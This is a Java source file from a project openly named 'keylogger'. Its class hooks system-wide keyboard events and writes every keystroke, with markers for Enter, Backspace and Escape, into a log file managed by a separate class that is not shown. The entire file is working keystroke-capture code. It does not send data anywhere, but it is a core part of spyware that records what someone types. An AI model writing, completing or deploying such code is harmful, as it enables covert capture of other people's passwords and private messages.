package keylogger;

import lc.kra.system.keyboard.event.GlobalKeyAdapter;
import lc.kra.system.keyboard.event.GlobalKeyEvent;

import java.io.IOException;

public class JavaKeyboardDispatcher extends GlobalKeyAdapter {

    @Override
    public void keyPressed(GlobalKeyEvent event) {
        var keyPressed = event.getVirtualKeyCode();
        FileWriteable writeable = JavaKeyboardOperator.fileWriterObject::append;

        try {
            switch (keyPressed) {
                case GlobalKeyEvent.VK_RETURN -> writeable.append("\n");
                case GlobalKeyEvent.VK_BACK -> writeable.append("[BACK]");
                case GlobalKeyEvent.VK_ESCAPE -> writeable.append("[END]");
                default-> writeable.append("%s".formatted(event.getKeyChar()));
            }
            JavaKeyboardOperator.fileWriterObject.flush();
        } catch (IOException e) {
            System.out.printf("Cannot write to %s%n", JavaKeyboardOperator.fileObject.getAbsolutePath());
        }
    }
}

interface FileWriteable {
    void append(CharSequence c) throws IOException;
}